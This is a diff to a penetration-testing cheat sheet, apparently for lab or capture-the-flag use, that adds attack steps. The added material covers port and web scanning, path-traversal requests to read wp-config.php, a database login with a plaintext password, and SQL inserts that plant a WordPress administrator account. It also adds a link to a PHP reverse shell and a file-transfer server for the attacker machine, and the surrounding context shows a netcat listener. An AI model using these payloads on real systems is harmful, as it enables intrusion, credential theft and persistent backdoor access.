@@ -2,9 +2,12 @@
 
 ## Scan
 
+### NMAP
 ```
 nmap -A -Pn -n --top-ports 10000 -vvv -oN 192.168.27.68
 ```
+### NIKTO
+nikto -h 10.10.10.10:8000
 
 
 ## Get Shell & Listen:
@@ -30,6 +33,29 @@ nc -nvlp 4444
 ***
 
 ## Exploitation
+
+### LFI
+
+oneExample:
+GET /../../../../xampp\php\extras\browscap.ini
+GET /../../../../xampp/htdocs/blog/wp-config.php
+
+
+### DB
+
+#### Connect MariaDB
+mysql -u root 10.10.10.10 -p Password@1
+
+SQL Query for Wordpress:
+```
+INSERT INTO `databasename`.`wp_users` (`ID`, `user_login`, `user_pass`, `user_nicename`, `user_email`, `user_url`, `user_registered`, `user_activation_key`, `user_status`, `display_name`) VALUES ('4', 'demo', MD5('demo'), 'Your Name', 'test@yourdomain.com', 'http://www.test.com/', '2011-06-07 00:00:00', '', '0', 'Your Name');
+ 
+ 
+INSERT INTO `databasename`.`wp_usermeta` (`umeta_id`, `user_id`, `meta_key`, `meta_value`) VALUES (NULL, '4', 'wp_capabilities', 'a:1:{s:13:"administrator";s:1:"1";}');
+ 
+ 
+INSERT INTO `databasename`.`wp_usermeta` (`umeta_id`, `user_id`, `meta_key`, `meta_value`) VALUES (NULL, '4', 'wp_user_level', '10');
+```
 
 ### Unstage & Stage Shell
 
@@ -83,6 +109,9 @@ $ip = '127.0.0.1';  // CHANGE THIS
 $port = 1234;       // CHANGE THIS
 ```
 
+##### PHP Windows-reverse-shell
+https://github.com/Dhayalanb/windows-php-reverse-shell
+
 ###### Upgrade Shell TTY
 
 python -c 'import pty; pty.spawn("/bin/bash")'  
@@ -94,10 +123,19 @@ python -c 'import pty; pty.spawn("/bin/bash")'
 ### C Compile
 
 linux:
-gcc -o hello hello.c
+> gcc -o hello hello.c
 
 windows 32 bit:
-i686-w64-mingw32-gcc -o hello.exe hello.cT
+> i686-w64-mingw32-gcc -o hello.exe hello.c
 
 windows 64 bit:
-x86_64-w64-mingw32 -o hello.exe hello.c
+> x86_64-w64-mingw32 -o hello.exe hello.c
+
+### File Transfer
+
+Attacker machine
+
+> python -m SimpleHTTPServer 8000
+
+> python3 -m http.server 8000
+
